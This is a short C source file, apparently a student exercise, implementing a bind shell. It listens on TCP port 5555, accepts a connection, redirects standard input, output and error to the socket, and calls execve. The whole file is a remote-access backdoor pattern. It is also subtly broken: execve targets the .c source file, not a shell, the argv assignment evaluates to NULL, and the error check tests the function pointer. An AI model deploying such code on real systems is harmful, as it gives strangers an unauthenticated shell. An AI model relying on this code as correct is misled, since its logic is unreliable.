#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
	int newsock;
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));//zeros out mememory of the addr struct
		addr.sin_family = AF_INET;
		addr.sin_port = htons(5555);
		addr.sin_addr.s_addr = htonl(INADDR_ANY);//LISTENS ON ANY INTERFACE

	int sockfd;
	sockfd = socket(AF_INET, SOCK_STREAM,0);
	if (sockfd < 0)
	{
		perror("error creating socket/n");
		close(sockfd);
		exit(1);
	}

	if (bind(sockfd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
	{
		perror("ERROR binding the socket/n");
		close(sockfd);
		exit (1);
	}

	if (listen(sockfd,0) < 0)
	{
		perror("ERROR listening on the network/n");
		close(sockfd);
		exit(1);
	}

	if ((newsock = accept(sockfd, NULL, NULL)) < 0)
	{
		perror("ERROR accept failed/n");
		close(sockfd);
		exit (1);
	}

	for (int i = 0; i < 3; ++i)
	{
		if (dup2(newsock, i) < 0)
		{
			perror("ERROR duplicating newsock");
			close(sockfd);
			close(newsock);
			exit(1);
		}
		printf("newsock, %d\n", i);
	}
//this is the absolute pathname of the the executable file
	char *pathname = "/mnt/c/Users/DELL/workflow01/preprogress/implementations/26_binding_shell.c";
	argv = ("26_binding_shell.c", NULL);//we are not inputing any arguments during execution so we set it to NULL
	char *envp[] = {NULL};

	execve(pathname, argv, envp);
	if (execve < 0) {
		perror("ERROR executing shell");
		close(newsock);
		close(sockfd);
	}

	close(newsock);
	close(sockfd);

	return 0;
}
